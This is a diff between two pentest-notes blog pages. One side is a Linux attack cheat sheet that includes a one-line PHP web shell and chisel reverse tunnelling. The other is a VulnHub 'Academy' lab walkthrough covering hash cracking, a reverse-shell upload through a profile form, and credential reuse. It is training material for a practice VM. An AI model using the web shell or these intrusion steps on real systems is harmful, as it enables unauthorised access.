@@ -10,14 +10,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>Linux &middot; 0x53CTF</title>
-  <meta name="title" content="Linux &middot; 0x53CTF" />
+  <title>TCM Academy &middot; 0x53CTF</title>
+  <meta name="title" content="TCM Academy &middot; 0x53CTF" />
   
   <meta name="description" content="My Personal Notes" />
   
   
   
-  <link rel="canonical" href="https://53ctf.github.io/posts/notes/linux/" />
+  <link rel="canonical" href="https://53ctf.github.io/posts/vulnhub/academy/" />
   
   
   
@@ -63,17 +63,17 @@
   
   
   
-  <meta property="og:title" content="Linux" />
-<meta property="og:description" content="View Cron Jobs&gt; View Cron Jobs # crontab -l List Scheduled Processes/Tasks/Scripts&gt; List Scheduled Processes/Tasks/Scripts # systemctl list-timers View NFS (Network File Share)&gt; View NFS (Network File Share) # showmount REMOTE_IP -e Mount NFS&gt; Mount NFS # mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT Crack ZIP Files&gt; Crack ZIP Files # fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE Find SUID Binaries&gt; Find SUID Binaries # find / -type f -perm -4000 2&gt;/dev/null PHP WebShell&gt; PHP WebShell # &lt;?" />
+  <meta property="og:title" content="TCM Academy" />
+<meta property="og:description" content="Nmap&gt; Nmap # 21/tcp open ftp syn-ack vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:192.168.1.142 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://53ctf.github.io/posts/notes/linux/" /><meta property="og:image" content="https://53ctf.github.io/posts/notes/linux/featured.png"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2023-01-07T09:33:57+05:30" />
-<meta property="article:modified_time" content="2023-01-07T09:33:57+05:30" /><meta property="og:site_name" content="0x53CTF" />
+<meta property="og:url" content="https://53ctf.github.io/posts/vulnhub/academy/" /><meta property="og:image" content="https://53ctf.github.io/posts/vulnhub/academy/featured.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-24T12:14:15+05:30" />
+<meta property="article:modified_time" content="2023-01-24T12:14:15+05:30" /><meta property="og:site_name" content="0x53CTF" />
 
   <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://53ctf.github.io/posts/notes/linux/featured.png"/>
-<meta name="twitter:title" content="Linux"/>
-<meta name="twitter:description" content="View Cron Jobs&gt; View Cron Jobs # crontab -l List Scheduled Processes/Tasks/Scripts&gt; List Scheduled Processes/Tasks/Scripts # systemctl list-timers View NFS (Network File Share)&gt; View NFS (Network File Share) # showmount REMOTE_IP -e Mount NFS&gt; Mount NFS # mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT Crack ZIP Files&gt; Crack ZIP Files # fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE Find SUID Binaries&gt; Find SUID Binaries # find / -type f -perm -4000 2&gt;/dev/null PHP WebShell&gt; PHP WebShell # &lt;?"/>
+<meta name="twitter:image" content="https://53ctf.github.io/posts/vulnhub/academy/featured.png"/>
+<meta name="twitter:title" content="TCM Academy"/>
+<meta name="twitter:description" content="Nmap&gt; Nmap # 21/tcp open ftp syn-ack vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:192.168.1.142 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3."/>
 
   
   <script type="application/ld+json">
@@ -81,26 +81,26 @@
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Posts",
-    "name": "Linux",
-    "headline": "Linux",
+    "name": "TCM Academy",
+    "headline": "TCM Academy",
     
-    "abstract": "View Cron Jobs\u003e View Cron Jobs # crontab -l List Scheduled Processes\/Tasks\/Scripts\u003e List Scheduled Processes\/Tasks\/Scripts # systemctl list-timers View NFS (Network File Share)\u003e View NFS (Network File Share) # showmount REMOTE_IP -e Mount NFS\u003e Mount NFS # mount -t nfs REMOTE_IP:\/PATH\/TO\/NFS\/SHARE \/LOCAL\/PATH\/TO\/MOUNT Crack ZIP Files\u003e Crack ZIP Files # fcrackzip -u -D -p \/PATH\/TO\/WORDLIST ZIP_FILE Find SUID Binaries\u003e Find SUID Binaries # find \/ -type f -perm -4000 2\u0026gt;\/dev\/null PHP WebShell\u003e PHP WebShell # \u0026lt;?",
+    "abstract": "Nmap\u003e Nmap # 21\/tcp open ftp syn-ack vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:192.168.1.142 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.",
     "inLanguage": "en",
-    "url" : "https:\/\/53ctf.github.io\/posts\/notes\/linux\/",
+    "url" : "https:\/\/53ctf.github.io\/posts\/vulnhub\/academy\/",
     "author" : {
       "@type": "Person",
       "name": "5YC10P5"
     },
     "copyrightYear": "2023",
-    "dateCreated": "2023-01-07T09:33:57\u002b05:30",
-    "datePublished": "2023-01-07T09:33:57\u002b05:30",
+    "dateCreated": "2023-01-24T12:14:15\u002b05:30",
+    "datePublished": "2023-01-24T12:14:15\u002b05:30",
     
-    "dateModified": "2023-01-07T09:33:57\u002b05:30",
+    "dateModified": "2023-01-24T12:14:15\u002b05:30",
     
-    "keywords": ["Notes","Linux"],
+    "keywords": ["VulnHub"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "780"
+    "wordCount": "760"
   }]
   </script>
 
@@ -475,7 +475,7 @@ if (!doNotTrack) {
 
     
     <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
-    style="background-image:url(/posts/notes/linux/featured_hu4292370f3b6c464f007d0918fcfc0cc0_548307_1200x0_resize_box_3.png);">
+    style="background-image:url(/posts/vulnhub/academy/featured_hu791af6c06b843dcbf4d3ad86bd72bb56_420541_1200x0_resize_box_3.png);">
     
 
 
@@ -528,8 +528,8 @@ if (!doNotTrack) {
   <li class="inline hidden">
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
-      href="/posts/notes/linux/"
-      >Linux</a
+      href="/posts/vulnhub/academy/"
+      >TCM Academy</a
     ><span class="px-1 text-primary-500">/</span>
   </li>
 
@@ -538,7 +538,7 @@ if (!doNotTrack) {
 
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      Linux
+      TCM Academy
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -583,9 +583,9 @@ if (!doNotTrack) {
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2023-01-07 09:33:57 &#43;0530 &#43;0530">7 January 2023</time><span class="px-2 text-primary-500">&middot;</span><span>780 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span><span class="px-2 text-primary-500">&middot;</span><span>
+  <time datetime="2023-01-24 12:14:15 &#43;0530 &#43;0530">24 January 2023</time><span class="px-2 text-primary-500">&middot;</span><span>760 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span><span class="px-2 text-primary-500">&middot;</span><span>
     
-    <span id="views_posts/notes/linux/index.md" title="views">0</span> 
+    <span id="views_posts/vulnhub/academy/index.md" title="views">0</span> 
     
     <span class="inline-block align-text-bottom">
 
@@ -623,46 +623,16 @@ if (!doNotTrack) {
     class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#nmap">Nmap</a></li>
+    <li><a href="#ftp-emuneration">FTP Emuneration</a></li>
+    <li><a href="#web-enumeration">Web Enumeration</a>
       <ul>
-        <li><a href="#view-cron-jobs">View Cron Jobs</a></li>
-        <li><a href="#list-scheduled-processestasksscripts">List Scheduled Processes/Tasks/Scripts</a></li>
-        <li><a href="#view-nfs-network-file-share">View NFS (Network File Share)</a></li>
-        <li><a href="#mount-nfs">Mount NFS</a></li>
-        <li><a href="#crack-zip-files">Crack ZIP Files</a></li>
-        <li><a href="#find-suid-binaries">Find SUID Binaries</a></li>
-        <li><a href="#php-webshell">PHP WebShell</a></li>
-        <li><a href="#smb-shares">SMB Shares</a></li>
-        <li><a href="#basic-chisel-port-forwarding">Basic Chisel Port Forwarding</a>
-          <ul>
-            <li><a href="#server">Server</a></li>
-            <li><a href="#client">Client</a></li>
-          </ul>
-        </li>
-        <li><a href="#find-open-ports">Find Open Ports</a></li>
-        <li><a href="#oskernel-information">OS/Kernel Information</a></li>
-        <li><a href="#cpu-information">CPU Information</a></li>
-        <li><a href="#identifying-the-network-route">Identifying the Network Route</a></li>
-        <li><a href="#discover-other-ip-address-on-a-network">Discover Other IP Address On A Network</a></li>
-        <li><a href="#look-for-a-specific-string-in-the-file-system">Look For A Specific String In The File System</a></li>
-        <li><a href="#find-passwords-in-history">Find Passwords in History</a></li>
-        <li><a href="#cracking-linuxbcrypt-password">Cracking Linux(bcrypt) Password</a></li>
-        <li><a href="#nslookup">NSLookup</a></li>
-        <li><a href="#dnsrecon">DNSRecon</a></li>
-        <li><a href="#git-dumper">Git-Dumper</a></li>
-        <li><a href="#ldapsearch">LDAPSearch</a></li>
-        <li><a href="#whatweb">WhatWeb</a></li>
-        <li><a href="#arpscan">ARPScan</a></li>
-        <li><a href="#netdiscover">NetDiscover</a></li>
-        <li><a href="#smbclient">SMBClient</a></li>
-        <li><a href="#ssh">SSH</a></li>
-        <li><a href="#evil-winrm">Evil-WinRM</a></li>
-        <li><a href="#ffuf">FFUF</a></li>
-        <li><a href="#crackmapexec">CrackMapExec</a></li>
-        <li><a href="#hydra">Hydra</a></li>
-        <li><a href="#an-easy-way-to-stabilize-a-shell">An Easy Way To Stabilize a Shell</a></li>
+        <li><a href="#directory-fuzzing">Directory Fuzzing</a></li>
       </ul>
     </li>
+    <li><a href="#foothold-www-data">Foothold [www-data]</a></li>
+    <li><a href="#prives-grimmie">Prives [Grimmie]</a></li>
+    <li><a href="#privesc-root">Privesc [Root]</a></li>
   </ul>
 </nav>
   </div>
@@ -676,46 +646,16 @@ if (!doNotTrack) {
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#nmap">Nmap</a></li>
+    <li><a href="#ftp-emuneration">FTP Emuneration</a></li>
+    <li><a href="#web-enumeration">Web Enumeration</a>
       <ul>
-        <li><a href="#view-cron-jobs">View Cron Jobs</a></li>
-        <li><a href="#list-scheduled-processestasksscripts">List Scheduled Processes/Tasks/Scripts</a></li>
-        <li><a href="#view-nfs-network-file-share">View NFS (Network File Share)</a></li>
-        <li><a href="#mount-nfs">Mount NFS</a></li>
-        <li><a href="#crack-zip-files">Crack ZIP Files</a></li>
-        <li><a href="#find-suid-binaries">Find SUID Binaries</a></li>
-        <li><a href="#php-webshell">PHP WebShell</a></li>
-        <li><a href="#smb-shares">SMB Shares</a></li>
-        <li><a href="#basic-chisel-port-forwarding">Basic Chisel Port Forwarding</a>
-          <ul>
-            <li><a href="#server">Server</a></li>
-            <li><a href="#client">Client</a></li>
-          </ul>
-        </li>
-        <li><a href="#find-open-ports">Find Open Ports</a></li>
-        <li><a href="#oskernel-information">OS/Kernel Information</a></li>
-        <li><a href="#cpu-information">CPU Information</a></li>
-        <li><a href="#identifying-the-network-route">Identifying the Network Route</a></li>
-        <li><a href="#discover-other-ip-address-on-a-network">Discover Other IP Address On A Network</a></li>
-        <li><a href="#look-for-a-specific-string-in-the-file-system">Look For A Specific String In The File System</a></li>
-        <li><a href="#find-passwords-in-history">Find Passwords in History</a></li>
-        <li><a href="#cracking-linuxbcrypt-password">Cracking Linux(bcrypt) Password</a></li>
-        <li><a href="#nslookup">NSLookup</a></li>
-        <li><a href="#dnsrecon">DNSRecon</a></li>
-        <li><a href="#git-dumper">Git-Dumper</a></li>
-        <li><a href="#ldapsearch">LDAPSearch</a></li>
-        <li><a href="#whatweb">WhatWeb</a></li>
-        <li><a href="#arpscan">ARPScan</a></li>
-        <li><a href="#netdiscover">NetDiscover</a></li>
-        <li><a href="#smbclient">SMBClient</a></li>
-        <li><a href="#ssh">SSH</a></li>
-        <li><a href="#evil-winrm">Evil-WinRM</a></li>
-        <li><a href="#ffuf">FFUF</a></li>
-        <li><a href="#crackmapexec">CrackMapExec</a></li>
-        <li><a href="#hydra">Hydra</a></li>
-        <li><a href="#an-easy-way-to-stabilize-a-shell">An Easy Way To Stabilize a Shell</a></li>
+        <li><a href="#directory-fuzzing">Directory Fuzzing</a></li>
       </ul>
     </li>
+    <li><a href="#foothold-www-data">Foothold [www-data]</a></li>
+    <li><a href="#prives-grimmie">Prives [Grimmie]</a></li>
+    <li><a href="#privesc-root">Privesc [Root]</a></li>
   </ul>
 </nav>
   </div>
@@ -769,310 +709,193 @@ if (!doNotTrack) {
       <div class="min-w-0 min-h-0 max-w-prose">
         
 
-        <div id="view-cron-jobs" class="anchor">View Cron Jobs></div>
-<h3 class="relative group">View Cron Jobs 
+        <div id="nmap" class="anchor">Nmap></div>
+<h2 class="relative group">Nmap 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#view-cron-jobs" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#nmap" aria-label="Anchor">#</a></span>        
     
-</h3><pre tabindex="0"><code>crontab -l
-</code></pre><div id="list-scheduled-processestasksscripts" class="anchor">List Scheduled Processes/Tasks/Scripts></div>
-<h3 class="relative group">List Scheduled Processes/Tasks/Scripts 
+</h2><pre tabindex="0"><code>21/tcp open  ftp     syn-ack vsftpd 3.0.3
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:192.168.1.142
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
+22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 c744588690fde4de5b0dbf078d055dd7 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIBuDzM6D8xmqki4fcCb1uEhi1lmznDpxYuviaBAbbHjCbMgiNZHBQj2gPjZcFhcgHkr5TtWv0slV3IyhbOZLvhaZUZu3HS/sm/Tz3heAx3C50MX1DcPNw3EpTDrzAwM5EsgnEEjAXPMXXG8JQ3X5k5xEbe2BoCBc1ZAxuLAXc2l3RyL/vrXCO2HappsmoZuX8OPchvtHSqBDjyQB/BDeb5VszUXTnb+utkE9bbZrFbYsa3Ed5JgOWMaxieKArHlECTpqlkdp5vSJ58iefVHwkq5qE2fap3G1HmcoI9RMNIT1AohXRQ8Hk5jQDr2xY8q6PjKGsxnw5YVmV7dx8j6aX
+|   256 78ec470f0f53aaa6054884809476a623 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDch5BCc2rqpCaaWap74M3GZ5y9APegx7XQyPXXIvxBgowvdssDnp119M5t59+djVOEoWiqKnaT0GQRpJWBs2Ig=
+|   256 999c3911dd3553a0291120c7f8bf71a4 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFHqfgMhJpRl/QNeg560fqH+J5jrVf0b/kUL9g94XZnp
+80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+| http-methods:
+|_  Supported Methods: HEAD GET POST OPTIONS
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Three ports are open.</p>
+<ul>
+<li><strong>21/TCP FTP</strong>
+<ul>
+<li>vsftpd 3.0.3</li>
+<li>Anonymous FTP login allowed</li>
+</ul>
+</li>
+<li><strong>22/TCP SSH</strong>
+<ul>
+<li>OpenSSH 7.9p1</li>
+<li>And its banner tells that this is a Debian machine</li>
+</ul>
+</li>
+<li><strong>80/TCP HTTP</strong></li>
+</ul>
+<div id="ftp-emuneration" class="anchor">FTP Emuneration></div>
+<h2 class="relative group">FTP Emuneration 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#list-scheduled-processestasksscripts" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#ftp-emuneration" aria-label="Anchor">#</a></span>        
     
-</h3><pre tabindex="0"><code>systemctl list-timers
-</code></pre><div id="view-nfs-network-file-share" class="anchor">View NFS (Network File Share)></div>
-<h3 class="relative group">View NFS (Network File Share) 
+</h2><p>According to the Nmap results we could be able to login to the <code>FTP</code> server anonymously. So let&rsquo;s login.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt;	ftp 192.168.1.136
+</span></span><span class="line"><span class="cl">Connected to 192.168.1.136.
+</span></span><span class="line"><span class="cl">Name <span class="o">(</span>192.168.1.136:syclops<span class="o">)</span>: anonymous
+</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
+</span></span></code></pre></div><p>We have only one file in available in the <code>FTP</code> server which is a text file named <code>note.txt</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp&gt; ls -lart
+</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> <span class="m">1000</span>     <span class="m">1000</span>          <span class="m">776</span> May <span class="m">30</span>  <span class="m">2021</span> note.txt
+</span></span></code></pre></div><p>Let&rsquo;s download and see whats in it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp&gt; get note.txt
+</span></span><span class="line"><span class="cl"><span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
+</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> note.txt <span class="o">(</span><span class="m">776</span> bytes<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer <span class="nb">complete</span>
+</span></span></code></pre></div><p><code>note.txt</code> contains this message.</p>
+<blockquote>
+<p>Hello Heath !</p>
+<p>Grimmie has setup the test website for the new academy.
+I told him not to use the same password everywhere, he will change it ASAP.</p>
+<p>I couldn&rsquo;t create a user via the admin panel, so instead I inserted directly into the database with the following command:</p>
+<p>INSERT INTO &lsquo;students&rsquo; (&lsquo;StudentRegno&rsquo;, &lsquo;studentPhoto&rsquo;, &lsquo;password&rsquo;, &lsquo;studentName&rsquo;, &lsquo;pincode&rsquo;, &lsquo;session&rsquo;, &lsquo;department&rsquo;, &lsquo;semester&rsquo;, &lsquo;cgpa&rsquo;, &lsquo;creationdate&rsquo;, &lsquo;updationDate&rsquo;) VALUES
+(&lsquo;10201321&rsquo;, &lsquo;&rsquo;, &lsquo;cd73502828457d15655bbd7a63fb0bc8&rsquo;, &lsquo;Rum Ham&rsquo;, &lsquo;777777&rsquo;, &lsquo;&rsquo;, &lsquo;&rsquo;, &lsquo;&rsquo;, &lsquo;7.60&rsquo;, &lsquo;2021-05-29 14:36:56&rsquo;, &lsquo;&rsquo;);</p>
+<p>The StudentRegno number is what you use for login.</p>
+<p>Le me know what you think of this open-source project, it&rsquo;s from 2020 so it should be secure&hellip; right ?
+We can always adapt it to our needs.</p>
+<p>-jdelta</p>
+</blockquote>
+<p>So now we have a <code>StudentRegno</code> and a <code>password</code>.
+<code>10201321:cd73502828457d15655bbd7a63fb0bc8</code><br>
+This is a MD5 hash. So let&rsquo;s crack it and get the actual password.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt;	<span class="nb">echo</span> <span class="s2">&#34;cd73502828457d15655bbd7a63fb0bc8&#34;</span> &gt; <span class="nb">hash</span>
+</span></span><span class="line"><span class="cl">&gt;	john --format<span class="o">=</span>raw-md5 -w<span class="o">=</span>/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt <span class="nb">hash</span>
+</span></span><span class="line"><span class="cl">student          <span class="o">(</span>?<span class="o">)</span>
+</span></span></code></pre></div><p>Now we have a valid set of credentials.<br>
+<code>10201321:student</code></p>
+<div id="web-enumeration" class="anchor">Web Enumeration></div>
+<h2 class="relative group">Web Enumeration 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#view-nfs-network-file-share" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#web-enumeration" aria-label="Anchor">#</a></span>        
     
-</h3><pre tabindex="0"><code>showmount REMOTE_IP -e
-</code></pre><div id="mount-nfs" class="anchor">Mount NFS></div>
-<h3 class="relative group">Mount NFS 
+</h2><p><code>http://192.168.1.136/</code> is just a defult apache homepage.</p>
+<div id="directory-fuzzing" class="anchor">Directory Fuzzing></div>
+<h3 class="relative group">Directory Fuzzing 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#mount-nfs" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#directory-fuzzing" aria-label="Anchor">#</a></span>        
     
-</h3><pre tabindex="0"><code>mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT
-</code></pre><div id="crack-zip-files" class="anchor">Crack ZIP Files></div>
-<h3 class="relative group">Crack ZIP Files 
+</h3><p>Found two directories.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt;	ffuf -u http://192.168.1.136/FUZZ -w /usr/share/wordlists/dirb/big.txt -c
+</span></span><span class="line"><span class="cl">academy                 <span class="o">[</span>Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 0ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">phpmyadmin              <span class="o">[</span>Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 1ms<span class="o">]</span>
+</span></span></code></pre></div><p>Login to the <code>http://192.168.1.136/academy/</code> using <code>10201321:student</code> credentials.</p>
+<div id="foothold-www-data" class="anchor">Foothold [www-data]></div>
+<h2 class="relative group">Foothold [www-data] 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#crack-zip-files" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#foothold-www-data" aria-label="Anchor">#</a></span>        
     
-</h3><pre tabindex="0"><code>fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE
-</code></pre><div id="find-suid-binaries" class="anchor">Find SUID Binaries></div>
-<h3 class="relative group">Find SUID Binaries 
+</h2><p>Looking at the site, I noticed that we can upload images to our profile picture from <code>http://192.168.1.136/academy/my-profile.php</code>. So let&rsquo;s upload one. But not a picture. Let&rsquo;s upload a <code>PHP Reverse Shell Script</code> instead. And make sure to start a netcat listener before you press the upload button.</p>
+<p>As soon as you press the upload button, you will get a reverse shell from the target machine as the <code>www-data</code> user.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt;	whoami
+</span></span><span class="line"><span class="cl">www-data
+</span></span><span class="line"><span class="cl">&gt;	id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span></code></pre></div><div id="prives-grimmie" class="anchor">Prives [Grimmie]></div>
+<h2 class="relative group">Prives [Grimmie] 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#find-suid-binaries" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#prives-grimmie" aria-label="Anchor">#</a></span>        
     
-</h3><pre tabindex="0"><code>find / -type f -perm -4000 2&gt;/dev/null
-</code></pre><div id="php-webshell" class="anchor">PHP WebShell></div>
-<h3 class="relative group">PHP WebShell 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#php-webshell" aria-label="Anchor">#</a></span>        
-    
-</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
-</span></span><span class="line"><span class="cl">	<span class="nx">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
+</h2><p>Looks like we have only one user.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt;	cat /etc/passwd <span class="p">|</span> grep sh
+</span></span><span class="line"><span class="cl">root❌0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">grimmie❌1000:1000:administrator,,,:/home/grimmie:/bin/bash
+</span></span></code></pre></div><p>Found MySQL database credentials from <code>/var/www/html/academy/includes/config.php</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$mysql_user</span> <span class="o">=</span> <span class="s2">&#34;grimmie&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$mysql_password</span> <span class="o">=</span> <span class="s2">&#34;My_V3ryS3cur3_P4ss&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$mysql_database</span> <span class="o">=</span> <span class="s2">&#34;onlinecourse&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div><div id="smb-shares" class="anchor">SMB Shares></div>
-<h3 class="relative group">SMB Shares 
+</span></span></span></code></pre></div><p>Login to the target machine as the user <code>grimmie</code> with the database credentials.</p>
+<div id="privesc-root" class="anchor">Privesc [Root]></div>
+<h2 class="relative group">Privesc [Root] 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#smb-shares" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#privesc-root" aria-label="Anchor">#</a></span>        
     
-</h3><pre tabindex="0"><code>smbmap -H REMOTE_IP -u USERNAME
-</code></pre><div id="basic-chisel-port-forwarding" class="anchor">Basic Chisel Port Forwarding></div>
-<h3 class="relative group">Basic Chisel Port Forwarding 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#basic-chisel-port-forwarding" aria-label="Anchor">#</a></span>        
-    
-</h3><div id="server" class="anchor">Server></div>
-<h4 class="relative group">Server 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#server" aria-label="Anchor">#</a></span>        
-    
-</h4><pre tabindex="0"><code>./chisel server --reverse --port LOCAL_PORT
-</code></pre><div id="client" class="anchor">Client></div>
-<h4 class="relative group">Client 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
